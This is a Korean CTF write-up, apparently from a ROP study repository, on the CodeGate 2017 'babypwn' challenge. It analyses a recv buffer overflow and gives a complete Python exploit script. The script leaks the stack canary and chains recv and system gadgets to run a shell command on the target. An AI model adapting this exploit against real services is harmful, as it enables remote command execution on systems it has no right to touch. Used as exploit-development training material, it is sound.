# babypwn
### CodeGate 2017
***babypwn은 코드게이트 2017 예선에 출제된 문제입니다.***

babypwn을 처음 실행하면, 아래 그림과 같이 CodeGate!라는 말과 함께 3가지의 선택지가 나옵니다.

![Alt text](https://github.com/Funniest/ROP_study/blob/master/babypwn/img/Stack.PNG)

여기서 취약한 곳을 정리하여 보겠습니다. (위, 아래 그림 참조)

![Alt text](https://github.com/Funniest/ROP_study/blob/master/babypwn/img/Vuln.PNG)

sub esp, 50 -> 0x50만큼 버퍼 생성

[ebp+var_34] -> 입력 버퍼

[ebp+var_c] -> 더미(?)

Stack_check가 있는 것으로 보아 더미 중간에canary(4byte)가 존재

취약한 함수 = call sub_8048907

buf의 크기는 총 0x34(52) + SFP = (56)인데, 입력은 0x64(100)만큼 받습니다.

└ recv(fd, buf, 0x64, 0)

즉 오버플로우가 일어나게 됩니다.

이제 익스플로잇에 필요한 가젯들을 정리해 보면,
1. Canary 카나리
2. recv_plt, recv_got
3. ppppr
4. system_plt
5. ppppr
6. bss영역

이 필요합니다.

익스플로잇 순서는
1. canary를 leak합니다.
2. 익스플로잇에 필요한 가젯들을 구합니다.
3. 구한 가젯들을 조합해서 페이로드를 작성합니다.
 
 └ recv_plt를 이용하여 bss영역에 실행하고 싶은 명령어를 씁니다.
 
 └ system_plt에 bss영역을 인자를 주어 명령어를 실행합니다.

### 소스코드
Ubuntu 16 LTS 32bit 환경에서 테스팅 해보았습니다.

```
from socket import *
from struct import *
from time import *

p = lambda x: pack("<L", x)
up = lambda x : unpack("<L", x)[0]

def sendline(s, string) :
    s.send(string + '\n')

s = socket(AF_INET, SOCK_STREAM)
s.connect(('192.168.228.138', 8181))

print "[+]step01 get canary"
print s.recv(2048)

sendline(s, '1')
print s.recv(1024)

'''
#canary
payload = ''
payload += 'A' * 41 #buffer[40] + canary[1] <= 0x00
s.send(payload)

print s.recv(1024)
print s.recv(41)
canary = "\x00"
canary += s.recv(3)
canary = up(canary)

print "Canary : " + str(hex(canary))
'''

canary = 0x12e5ca00
send_plt = 0x8048700
send_got = 0x804B064
recv_plt = 0x80486E0
recv_got = 0x804B05C
bss = 0x804b1b4
ppppr = 0x8048eec
system_plt = 0x8048620

cmd = 'ls -al'

payload = ''
payload += 'A' * 40
payload += p(canary)
payload += 'B' * 12

payload += p(recv_plt)
payload += p(ppppr)
payload += p(0x04)
payload += p(bss)
payload += p(len(cmd))
payload += p(0x00)
payload += p(system_plt)
payload += p(0x41414141)
payload += p(bss)

s.send(payload)

print s.recv(1024)
sendline(s, '3')

sendline(s, cmd)
print s.recv(1024)
s.close()
```
